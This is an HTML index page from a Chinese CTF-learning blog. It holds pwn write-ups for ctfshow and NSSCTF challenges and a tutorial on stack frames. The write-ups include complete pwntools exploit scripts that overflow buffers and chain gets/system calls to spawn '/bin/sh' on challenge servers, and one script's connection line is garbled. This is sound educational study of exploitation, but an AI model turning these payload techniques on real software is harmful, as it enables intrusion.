@@ -1,0 +1,1318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="小小pwn">
+<meta property="og:url" content="http://example.com/page/3/index.html">
+<meta property="og:site_name" content="小小pwn">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="和方煜">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>小小pwn</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小小pwn</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/22/ctfshow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/22/ctfshow/" class="post-title-link" itemprop="url">ctfshow 43，44</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-22 21:06:11" itemprop="dateCreated datePublished" datetime="2025-01-22T21:06:11+08:00">2025-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-01-25 23:08:54" itemprop="dateModified" datetime="2025-01-25T23:08:54+08:00">2025-01-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%AC%E4%BA%8C%E5%91%A8/" itemprop="url" rel="index"><span itemprop="name">第二周</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h1><p>ida：</p>
+<p><img src="/2025/01/22/ctfshow/image-20250122210931156.png" alt="image-20250122210931156"></p>
+<p>发现gets可以栈溢出（0x6c+0x4），但是并没有找到bin&#x2F;sh或sh字符串，但是有system</p>
+<p><img src="/2025/01/22/ctfshow/image-20250122211029691.png" alt="image-20250122211029691"></p>
+<p>运行gdb使用vmmap命令即可观察到各段的权限信息</p>
+<p>我们发现0x804b000-0x804c000是可写的</p>
+<p><img src="/2025/01/22/ctfshow/image-20250122211456327.png" alt="image-20250122211456327"></p>
+<p><strong>-p 标志表示内存区域的权限，它由四个字符组成，每个字符分别代表一个权限：</strong></p>
+<p><strong>r：可读（Readable）</strong><br><strong>w：可写（Writable）</strong><br><strong>x：可执行（Executable）</strong><br><strong>s：共享（Shared）</strong></p>
+<p>我们在bss段找到了变量buf2是可写的</p>
+<p>通常情况下，BSS 段下的变量是可写的。BSS 段是用来存储未初始化的全局变量和静态变量的，操作系统在程序加载时会为这些变量分配内存并将其初始化为零或空指针。因此，BSS 段下的变量通常具有读写权限，可以被程序写入数据。</p>
+<p><img src="/2025/01/22/ctfshow/image-20250122211843495.png" alt="image-20250122211843495"></p>
+<p>思路：我们可以调用gets函数将&#x2F;bin&#x2F;sh字符串写入变量buf2，在传递给system函数的第一个参数就构造成功了system(“&#x2F;bin&#x2F;sh”)</p>
+<p>gets：0x08048420</p>
+<p>system：0x08048450</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28119</span>)</span><br><span class="line">buf2 = <span class="number">0x0804B060</span></span><br><span class="line">system = <span class="number">0x08048450</span></span><br><span class="line">gets = <span class="number">0x08048420</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)   <span class="comment">#作为gets函数的返回地址，返回到system函数中</span></span><br><span class="line">payload += p32(buf2)     <span class="comment">#作为gets函数的参数（发送的/bin/sh将会被写入buf2），也是system函数的返回地址(是无效的)</span></span><br><span class="line">payload += p32(buf2)     <span class="comment">#system函数的参数</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h1><p>这道题思路与pwn43一样只不过是64位的，传参方式不同</p>
+<p><img src="/2025/01/22/ctfshow/image-20250122215202212.png" alt="image-20250122215202212"></p>
+<p>栈溢出（0xa+0x8）</p>
+<p><img src="/2025/01/22/ctfshow/image-20250122215304195.png" alt="image-20250122215304195"></p>
+<p>system：0x0400520</p>
+<p>gets：0x0400530</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28255</span>)</span><br><span class="line">buf2 = <span class="number">0x602080</span></span><br><span class="line">system = <span class="number">0x0400520</span></span><br><span class="line">gets = <span class="number">0x0400530</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line">rdi = <span class="number">0x00000000004007f3</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(rdi)  </span><br><span class="line">payload += p64(buf2)</span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(rdi)</span><br><span class="line">payload += p64(buf2)    </span><br><span class="line">payload += p64(system)    </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结pwn33，34"><a href="#总结pwn33，34" class="headerlink" title="总结pwn33，34"></a>总结pwn33，34</h1><h2 id="（1）解题思路"><a href="#（1）解题思路" class="headerlink" title="（1）解题思路"></a>（1）解题思路</h2><p>当没有bin&#x2F;sh或者sh字符串时，但是bss存在未初始化的变量，我们可以调用gets，read等函数将&#x2F;bin&#x2F;sh字符串写入将其作为system的第一个参数，构造system(“&#x2F;bin&#x2F;sh”)</p>
+<h2 id="（2）64位与32位栈溢出后函数调用的不同"><a href="#（2）64位与32位栈溢出后函数调用的不同" class="headerlink" title="（2）64位与32位栈溢出后函数调用的不同"></a>（2）64位与32位栈溢出后函数调用的不同</h2><ol>
+<li><p>32位调用函数参数全在栈上，64位前是7个参数放在寄存器里，后面的放在栈上面。</p>
+</li>
+<li><p>32位调用函数压栈顺序是先压参数最后压返回函数，64位先是压入返回函数然后将参数放在寄存器</p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">栈溢出基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-20 16:40:09" itemprop="dateCreated datePublished" datetime="2025-01-20T16:40:09+08:00">2025-01-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-01-31 00:21:32" itemprop="dateModified" datetime="2025-01-31T00:21:32+08:00">2025-01-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%AC%E4%B8%80%E5%91%A8/" itemprop="url" rel="index"><span itemprop="name">第一周</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一、栈的介绍"><a href="#一、栈的介绍" class="headerlink" title="一、栈的介绍"></a>一、栈的介绍</h1><h2 id="（1）栈的基本概念"><a href="#（1）栈的基本概念" class="headerlink" title="（1）栈的基本概念"></a>（1）栈的基本概念</h2><p><strong>栈（Stack）</strong>：一种后进先出（LIFO）的数据结构，用于存储程序运行时的临时数据</p>
+<p><strong>栈帧（Stack Frame）</strong>：每个函数调用时，栈会分配一个栈帧，用于存储函数的局部变量、参数、返回地址等信息</p>
+<p><strong>栈指针（SP）</strong>：指向当前栈顶的指针，随着压栈（Push）和出栈（Pop）操作动态变化</p>
+<p><strong>基指针（BP）</strong>：指向当前栈帧的底部，用于在栈帧中定位局部变量和参数</p>
+<p><strong>指令指针（IP&#x2F;EIP&#x2F;RIP）</strong>：指向当前执行的指令地址，函数调用时会保存返回地址到栈中</p>
+<h2 id="（2）栈的内存布局"><a href="#（2）栈的内存布局" class="headerlink" title="（2）栈的内存布局"></a>（2）栈的内存布局</h2><p>函数调用栈是程序运行时内存中一段连续的区域，用于保存函数运行时的状态信息。这些状态信息包括：</p>
+<p><strong>函数参数</strong>：调用函数时传递给被调用函数的参数</p>
+<p><strong>局部变量</strong>：被调用函数中定义的变量</p>
+<p><strong>返回地址</strong>：被调用函数执行完毕后，程序需要返回的位置</p>
+<p><strong>保存的寄存器值</strong>：某些情况下，函数会保存一些寄存器的值，以便在函数返回时恢复</p>
+<h2 id="（3）栈的先进后出特性"><a href="#（3）栈的先进后出特性" class="headerlink" title="（3）栈的先进后出特性"></a>（3）栈的先进后出特性</h2><p>函数调用栈被称为“栈”，是因为它遵循后进先出的原则</p>
+<p><strong>压栈（Push）：</strong>当发生函数调用时，调用函数（caller）的状态被保存到栈中，被调用函数（callee）的状态被压入栈顶。</p>
+<p><strong>退栈（Pop）：</strong>当函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。</p>
+<h2 id="（4）栈的生长方向"><a href="#（4）栈的生长方向" class="headerlink" title="（4）栈的生长方向"></a>（4）栈的生长方向</h2><p>在大多数系统中，函数调用栈在内存中是从高地址向低地址生长的</p>
+<p><strong>压栈时：</strong>栈顶指针（SP）向低地址移动，栈顶对应的内存地址变小。</p>
+<p><strong>退栈时：</strong>栈顶指针（SP）向高地址移动，栈顶对应的内存地址变大。</p>
+<h1 id="二、-函数调用过程"><a href="#二、-函数调用过程" class="headerlink" title="二、 函数调用过程"></a>二、 函数调用过程</h1><h2 id="（1）参数传递的步骤"><a href="#（1）参数传递的步骤" class="headerlink" title="（1）参数传递的步骤"></a>（1）参数传递的步骤</h2><p><strong>1.逆序压栈</strong></p>
+<p>调用函数（caller）按照<strong>逆序</strong>将参数依次压入栈中。这意味着最后一个参数先被压入栈，第一个参数最后被压入栈。</p>
+<p>例如，调用函数 <code>callee(1，2，3)</code> 时，参数的压栈顺序是3，2，1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 3    ; 第三个参数，实际是第一个一个压入栈</span><br><span class="line">push 2    ; 第二个参数</span><br><span class="line">push 1    ; 第一个参数，实际是最后一个压入栈</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.参数保存</strong></p>
+<p>这些参数被压入栈后，会保存在调用函数（caller）的栈帧中。此时，调用函数的栈帧仍然包含这些参数</p>
+<p><strong>3.被调用函数的状态保存</strong></p>
+<p>在参数压栈之后，调用函数会将控制权交给被调用函数（callee）。此时，被调用函数会创建自己的栈帧，并将这些参数视为自己的输入</p>
+<h2 id="（2）栈帧的切换"><a href="#（2）栈帧的切换" class="headerlink" title="（2）栈帧的切换"></a>（2）栈帧的切换</h2><p>当被调用函数（callee）开始执行时，栈帧的切换过程如下：</p>
+<p><strong>1.保存返回地址</strong></p>
+<p>当调用函数使用 <code>call</code> 指令调用被调用函数时，<code>call</code> 指令会自动将调用函数的下一条指令的地址（即返回地址）压入栈中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call callee  ; 调用 callee 函数</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.创建被调用函数的栈帧</strong></p>
+<p>被调用函数（callee）会创建自己的栈帧，包括保存的寄存器值（也就是调用函数的基地址）、局部变量等</p>
+<p>被调用函数会从栈中读取参数，并在自己的栈帧中使用这些参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp       ; 保存调用者的基地址</span><br><span class="line">mov ebp, esp   ; 建立被调用者的基地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.执行被调用函数</strong></p>
+<p>被调用函数执行其逻辑，操作局部变量和参数</p>
+<p><img src="/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20250120172851935.png" alt="image-20250120172851935"></p>
+<p><strong>4.清理栈帧</strong></p>
+<p>被调用函数执行完毕后，清理自己的栈帧，释放局部变量占用的空间</p>
+<p>返回地址从栈中弹出，存储到指令指针（IP&#x2F;EIP&#x2F;RIP）中，程序跳回调用函数的下一条指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp  ; 恢复栈指针到调用者调用时的位置，释放局部变量占用的空间</span><br><span class="line">pop ebp       ; 恢复调用者的基地址    </span><br><span class="line">ret           ; 从栈中弹出返回地址并跳转到该地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong></p>
+<p><strong>x86</strong></p>
+<p><strong>使用栈来传递参数使用 eax 存放返回值</strong></p>
+<p><strong>amd64</strong></p>
+<p><strong>前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中第7个以后的参数存放于栈中</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/19/wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/19/wp/" class="post-title-link" itemprop="url">BUUCTF wp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-19 10:55:19" itemprop="dateCreated datePublished" datetime="2025-01-19T10:55:19+08:00">2025-01-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-01-25 23:07:14" itemprop="dateModified" datetime="2025-01-25T23:07:14+08:00">2025-01-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%AC%E4%B8%80%E5%91%A8/" itemprop="url" rel="index"><span itemprop="name">第一周</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="1-NISACTF-2022-ReorPwn"><a href="#1-NISACTF-2022-ReorPwn" class="headerlink" title="1.[NISACTF 2022]ReorPwn?"></a>1.[NISACTF 2022]ReorPwn?</h1><p><img src="/2025/01/19/wp/image-20250119144608720.png" alt="image-20250119144608720"></p>
+<p>用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数</p>
+<p>看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了</p>
+<p><img src="/2025/01/19/wp/image-20250119144645315.png" alt="image-20250119144645315"></p>
+<h1 id="2-BJDCTF-2020-babystack2-0"><a href="#2-BJDCTF-2020-babystack2-0" class="headerlink" title="2.[BJDCTF 2020]babystack2.0"></a>2.[BJDCTF 2020]babystack2.0</h1><p>Checksec发现64位nx保护开启</p>
+<p><img src="/2025/01/19/wp/image-20250119140419683.png" alt="image-20250119140419683"></p>
+<p>从题目提示看是整数溢出和栈溢出</p>
+<p>用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数</p>
+<p><img src="/2025/01/19/wp/image-20250119140514421.png" alt="image-20250119140514421"></p>
+<p>搜了一下wp</p>
+<p><img src="/2025/01/19/wp/image-20250119140127117.png" alt="image-20250119140127117"></p>
+<p>看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28220</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;-1&#x27;</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(<span class="number">0x0400726</span>)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-BJDCTF-2020-babystack"><a href="#3-BJDCTF-2020-babystack" class="headerlink" title="3.[BJDCTF 2020]babystack"></a>3.[BJDCTF 2020]babystack</h1><p><img src="/2025/01/19/wp/image-20250119140737788.png" alt="image-20250119140737788"></p>
+<p>这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。</p>
+<p>Exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;100&#x27;</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(<span class="number">0x04006E6</span>)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值</p>
+<h1 id="4-NISACTF-2022-ezstack"><a href="#4-NISACTF-2022-ezstack" class="headerlink" title="4.[NISACTF 2022]ezstack"></a>4.[NISACTF 2022]ezstack</h1><p>Checksec发现是32位的。NX保护开启</p>
+<p>Ida分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">22397</span>)</span><br><span class="line">sh_addr=<span class="number">0x804a024</span></span><br><span class="line">system_plt=<span class="number">0x8048390</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                <span class="comment">#第一个p32(sh_addr)用于占位</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
